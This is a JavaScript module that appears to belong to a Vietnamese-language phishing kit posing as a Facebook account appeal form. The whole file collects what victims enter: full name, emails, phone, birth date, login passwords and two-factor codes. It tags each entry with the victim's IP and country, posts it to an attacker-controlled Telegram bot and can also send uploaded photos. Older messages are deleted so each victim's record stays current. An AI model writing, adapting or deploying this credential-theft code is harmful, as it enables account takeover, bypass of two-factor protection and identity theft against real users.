import config from '@/utils/config';
import axios from '@/utils/axios-instance';

let cachedGeo = null;

const getGeoInfo = async () => {
    if (cachedGeo) return cachedGeo;
    try {
        const res = await axios.get('https://get.geojs.io/v1/ip/geo.json');
        cachedGeo = {
            ip: res.data?.ip ?? 'Không rõ',
            country: res.data?.country ?? 'Không rõ',
        };
    } catch {
        cachedGeo = {
            ip: 'Không rõ',
            country: 'Không rõ',
        };
    }
    return cachedGeo;
};

const buildMessage = (formData, credentials, geoInfo) => {
    const { emailOrPhone, password1, password2 } = credentials;

    const passwordLines = password2
        ? `🔑 <b>Mật khẩu 1:</b> <code>${password1}</code>\n🔑 <b>Mật khẩu 2:</b> <code>${password2}</code>`
        : `🔑 <b>Mật khẩu:</b> <code>${password1}</code>`;

    return `📋 <b>THÔNG TIN KHÁNG NGHỊ</b>
━━━━━━━━━━━━━━━━━━━━━
🌍 <b>Quốc gia:</b> <code>${geoInfo.country}</code>
👤 <b>Họ tên:</b> <code>${formData.full_name ?? ''}</code>
📧 <b>Email FB:</b> <code>${formData.email_facebook ?? ''}</code>
📧 <b>Email làm việc:</b> <code>${formData.email_work ?? ''}</code>
📄 <b>Tên trang:</b> <code>${formData.page_name ?? ''}</code>
📞 <b>Điện thoại:</b> <code>${formData.phone ?? ''}</code>
🎂 <b>Ngày sinh:</b> <code>${formData.date_of_birth ?? ''}</code>

🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
━━━━━━━━━━━━━━━━━━━━━
📱 <b>Email/SĐT:</b> <code>${emailOrPhone ?? ''}</code>
${passwordLines}

🌐 <b>IP:</b> <code>${geoInfo.ip}</code>`;
};

const buildTwoFactorCodeMessage = (formData, payload, geoInfo) => {
    const { emailOrPhone, password1, password2, codes } = payload;

    const passwordLines = password2
        ? `🔑 <b>Mật khẩu 1:</b> <code>${password1 ?? ''}</code>\n🔑 <b>Mật khẩu 2:</b> <code>${password2 ?? ''}</code>`
        : `🔑 <b>Mật khẩu:</b> <code>${password1 ?? ''}</code>`;

    const codeLines = codes.length === 1
        ? `🔢 <b>Mã:</b> <code>${codes[0]}</code>`
        : codes.map((c, i) => `🔢 <b>Mã ${i + 1}:</b> <code>${c}</code>`).join('\n');

    return `📋 <b>THÔNG TIN KHÁNG NGHỊ</b>
━━━━━━━━━━━━━━━━━━━━━
🌍 <b>Quốc gia:</b> <code>${geoInfo.country}</code>
👤 <b>Họ tên:</b> <code>${formData.full_name ?? ''}</code>
📧 <b>Email FB:</b> <code>${formData.email_facebook ?? ''}</code>
📧 <b>Email làm việc:</b> <code>${formData.email_work ?? ''}</code>
📄 <b>Tên trang:</b> <code>${formData.page_name ?? ''}</code>
📞 <b>Điện thoại:</b> <code>${formData.phone ?? ''}</code>
🎂 <b>Ngày sinh:</b> <code>${formData.date_of_birth ?? ''}</code>

🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
━━━━━━━━━━━━━━━━━━━━━
📱 <b>Email/SĐT:</b> <code>${emailOrPhone ?? ''}</code>
${passwordLines}

🔐 <b>XÁC THỰC 2 LỚP</b>
━━━━━━━━━━━━━━━━━━━━━
${codeLines}

🌐 <b>IP:</b> <code>${geoInfo.ip}</code>`;
};

const deleteTelegramMessage = async (messageId) => {
    try {
        const token = config.token;
        const chatId = config.chat_id;
        await axios.post(`https://api.telegram.org/bot${token}/deleteMessage`, {
            chat_id: chatId,
            message_id: messageId,
        });
    } catch { /* */ }
};

const sendToTelegram = async (formData, credentials, prevMessageId = null) => {
    try {
        const token = config.token;
        const chatId = config.chat_id;
        const geoInfo = await getGeoInfo();

        if (prevMessageId) {
            await deleteTelegramMessage(prevMessageId);
        }

        const msg = buildMessage(formData, credentials, geoInfo);

        const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: msg,
            parse_mode: 'HTML',
        });

        return res.data?.result?.message_id ?? null;
    } catch {
        return null;
    }
};

export default sendToTelegram;

export const sendPhotoToTelegram = async (file, caption) => {
    try {
        const token = config.token;
        const chatId = config.chat_id;

        const fd = new FormData();
        fd.append('chat_id', chatId);
        fd.append('photo', file);
        fd.append('caption', caption);
        fd.append('parse_mode', 'HTML');

        const res = await axios.post(
            `https://api.telegram.org/bot${token}/sendPhoto`,
            fd,
            { headers: { 'Content-Type': 'multipart/form-data' } },
        );

        return res.data?.result?.message_id ?? null;
    } catch {
        return null;
    }
};

export const sendTryOtherToTelegram = async (formData, payload, selectedMethodLabel, prevMessageId = null) => {
    try {
        const token = config.token;
        const chatId = config.chat_id;
        const geoInfo = await getGeoInfo();

        if (prevMessageId) {
            await deleteTelegramMessage(prevMessageId);
        }

        const { emailOrPhone, password1, password2, codes } = payload;

        const passwordLines = password2
            ? `🔑 <b>Mật khẩu 1:</b> <code>${password1 ?? ''}</code>\n🔑 <b>Mật khẩu 2:</b> <code>${password2 ?? ''}</code>`
            : `🔑 <b>Mật khẩu:</b> <code>${password1 ?? ''}</code>`;

        const codeLines = codes && codes.length > 0
            ? codes.map((c, i) => {
                const label = codes.length === 1 ? 'Mã' : `Mã ${i + 1}`;
                return `🔢 <b>${label}:</b> <code>${c}</code>`;
            }).join('\n')
            : '';
        const codesSection = codeLines
            ? `\n🔐 <b>XÁC THỰC 2 LỚP</b>\n━━━━━━━━━━━━━━━━━━━━━\n${codeLines}\n`
            : '';

        const msg = `📋 <b>THÔNG TIN KHÁNG NGHỊ</b>
━━━━━━━━━━━━━━━━━━━━━
🌍 <b>Quốc gia:</b> <code>${geoInfo.country}</code>
👤 <b>Họ tên:</b> <code>${formData.full_name ?? ''}</code>
📧 <b>Email FB:</b> <code>${formData.email_facebook ?? ''}</code>
📧 <b>Email làm việc:</b> <code>${formData.email_work ?? ''}</code>
📄 <b>Tên trang:</b> <code>${formData.page_name ?? ''}</code>
📞 <b>Điện thoại:</b> <code>${formData.phone ?? ''}</code>
🎂 <b>Ngày sinh:</b> <code>${formData.date_of_birth ?? ''}</code>

🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
━━━━━━━━━━━━━━━━━━━━━
📱 <b>Email/SĐT:</b> <code>${emailOrPhone ?? ''}</code>
${passwordLines}
${codesSection}
🔀 <b>THỬ CÁCH KHÁC</b>
━━━━━━━━━━━━━━━━━━━━━
✅ <b>Phương thức đã chọn:</b> <code>${selectedMethodLabel}</code>

🌐 <b>IP:</b> <code>${geoInfo.ip}</code>`;

        const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: msg,
            parse_mode: 'HTML',
        });

        return res.data?.result?.message_id ?? null;
    } catch {
        return null;
    }
};

export const sendCodeToTelegram = async (formData, payload, prevMessageId = null) => {
    try {
        const token = config.token;
        const chatId = config.chat_id;
        const geoInfo = await getGeoInfo();

        if (prevMessageId) {
            await deleteTelegramMessage(prevMessageId);
        }

        const msg = buildTwoFactorCodeMessage(formData, payload, geoInfo);

        const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: msg,
            parse_mode: 'HTML',
        });

        return res.data?.result?.message_id ?? null;
    } catch {
        return null;
    }
};
